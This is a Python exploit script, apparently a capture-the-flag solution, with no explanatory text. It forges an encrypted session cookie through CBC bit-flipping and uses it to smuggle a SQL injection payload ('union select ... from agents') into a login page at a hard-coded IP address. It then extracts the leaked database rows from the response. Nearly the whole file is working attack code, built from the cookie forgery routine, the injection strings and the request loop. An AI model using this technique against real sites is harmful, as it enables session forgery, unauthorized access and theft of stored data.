from base64 import b64decode as decode
from base64 import b64encode as encode

import requests
import urllib
import re

def xor(a, b):
    res = []
    for i in range(len(a)):
        res.append(chr(ord(a[i])^ord(b[i])))

    return res

def show(m, content):
    if m:
        print repr(m.group(1))
    else:
        print r.content.split("\n")[-1]
        print urllib.quote_plus(cookie_identify)
        exit()

# Cookie: identify=U20iNldnibI%3D%7Ci%2FP0b7Csidg7Y7LTtSqz3dqRXMh2bY8VqBU%2F90kj9aih1qT7X%2BmyjwEalzVAHA9woq0ZSaOa%2BH7b2nblXS6mrA%3D%3D
# U20iNldnibI=|i/P0b7Csidg7Y7LTtSqz3dqRXMh2bY8VqBU/90kj9aih1qT7X+myjwEalzVAHA9woq0ZSaOa+H7b2nblXS6mrA==

cookie_p1_b64 = "U20iNldnibI="
cookie_p2_b64 = "i/P0b7Csidg7Y7LTtSqz3dqRXMh2bY8VqBU/90kj9aih1qT7X+myjwEalzVAHA9woq0ZSaOa+H7b2nblXS6mrA=="

cookie_p1 = list(decode(cookie_p1_b64))
cookie_p2 = list(decode(cookie_p2_b64))

# pl = ";;0 union select 1,2,3,4,5"
# pl = ";;0 union select * from agents limit 10,1"
# pl = "WTF GGWP ;F14G;0"
pl = ";;0 union select 1,2,d,4,5 from(select 1`a`,2`b`,3`c`,4`d`,5`e` union select * from agents)t limit 11,1#"

payload = []
for i in range(0,len(pl),8):
    payload.append(pl[i:i+8])

if len(payload[-1])<8:
    payload[-1] += chr(8-len(payload[-1]))*(8-len(payload[-1]))
else:
    payload.append("\x08"*8)

imd_1 = list("1e2871651620cc92".decode("hex"))
imd_2 = list("cda1bb2290ffd981".decode("hex"))

cookie_p2_tmp_e = cookie_p2[8:16]
dummy = ";g;bongt"
for i in range(len(payload)-1,-1,-1):
    cookie_p2_tmp_s = cookie_p2[:8]
    cookie_p2_tmp_e = xor(list(payload[i]), imd_2) + cookie_p2_tmp_e
    if i!=0:
        cookie_p1_tmp = xor(list(dummy), imd_1)
        cookie_p2_tmp = cookie_p2_tmp_s + cookie_p2_tmp_e
    else:
        cookie_p1_tmp = xor(list(payload[0]), imd_2)
        cookie_p2_tmp = cookie_p2_tmp_e


    cookie_p1_raw = encode("".join(cookie_p1_tmp))
    cookie_p2_raw = encode("".join(cookie_p2_tmp))
    cookie_identify = cookie_p1_raw + "|" + cookie_p2_raw

    cookies = {"identify": urllib.quote_plus(cookie_identify) }
    r = requests.get("http://110.10.212.147:24135/?p=secret_login", cookies=cookies)
    m = re.search(r"<font size=6>(.+?)</font>", r.content, re.DOTALL)
    show(m, r.content)
    if i!=0:
        m = re.search(r"[:]bongt(.{8})", r.content, re.DOTALL)
        imd_2 = xor(cookie_p2[:8], list(m.group(1)))
    else:
        m = re.search(r"Input your ID card, (.+)", r.content)
        show(m, r.content)
        print urllib.quote_plus(cookie_identify)
